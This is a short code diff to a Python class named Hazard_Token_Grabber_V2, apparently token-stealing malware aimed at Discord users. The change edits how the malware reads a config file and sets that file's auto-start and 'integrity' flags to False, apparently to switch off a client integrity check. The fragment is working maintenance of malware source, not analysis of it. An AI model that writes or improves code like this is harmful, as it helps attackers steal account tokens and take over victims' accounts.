@@ -192,11 +192,8 @@ class Hazard_Token_Grabber_V2(functions):
             except FileNotFoundError:
                 pass
         if os.path.exists(config):
-            with open(config) as f:
-                try:
-                    item = json.load(f)
-                except json.decoder.JSONDecodeError:
-                    pass
+            with open(config, errors="ignore") as f:
+                item = json.load(f)
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
